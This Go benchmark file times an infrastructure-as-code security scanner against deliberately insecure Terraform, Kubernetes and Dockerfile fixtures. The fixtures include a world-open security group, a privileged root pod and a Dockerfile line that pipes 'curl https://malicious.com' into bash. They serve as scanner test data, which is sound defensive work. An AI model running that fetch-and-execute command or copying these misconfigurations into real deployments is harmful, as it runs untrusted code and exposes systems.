package iac

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/cozygarage/sentinelflow/internal/config"
)

// BenchmarkScanTerraform benchmarks scanning a Terraform file
func BenchmarkScanTerraform(b *testing.B) {
	tmpDir := b.TempDir()
	content := []byte(`
resource "aws_s3_bucket" "example" {
  bucket = "my-bucket"
  acl    = "public-read"
  
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }
}

resource "aws_security_group" "allow_all" {
  name        = "allow_all"
  description = "Allow all inbound traffic"

  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
`)
	path := filepath.Join(tmpDir, "main.tf")
	os.WriteFile(path, content, 0644)

	fullCfg := &config.Config{
		Scanners: config.ScannersConfig{
			IaC: config.IaCConfig{
				Enabled: true,
			},
		},
	}
	s := NewScanner(fullCfg)
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = s.Scan(ctx, path, nil)
	}
}

// BenchmarkScanKubernetes benchmarks scanning a Kubernetes manifest
func BenchmarkScanKubernetes(b *testing.B) {
	tmpDir := b.TempDir()
	content := []byte(`
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  containers:
  - name: nginx
    image: nginx:latest
    securityContext:
      privileged: true
      runAsUser: 0
    ports:
    - containerPort: 80
      hostPort: 8080
`)
	path := filepath.Join(tmpDir, "pod.yaml")
	os.WriteFile(path, content, 0644)

	fullCfg := &config.Config{
		Scanners: config.ScannersConfig{
			IaC: config.IaCConfig{
				Enabled: true,
			},
		},
	}
	s := NewScanner(fullCfg)
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = s.Scan(ctx, path, nil)
	}
}

// BenchmarkScanDockerfile benchmarks scanning a Dockerfile
func BenchmarkScanDockerfile(b *testing.B) {
	tmpDir := b.TempDir()
	content := []byte(`
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
USER root
COPY . /app
RUN curl https://malicious.com | bash
CMD ["./app"]
`)
	path := filepath.Join(tmpDir, "Dockerfile")
	os.WriteFile(path, content, 0644)

	fullCfg := &config.Config{
		Scanners: config.ScannersConfig{
			IaC: config.IaCConfig{
				Enabled: true,
			},
		},
	}
	s := NewScanner(fullCfg)
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = s.Scan(ctx, path, nil)
	}
}
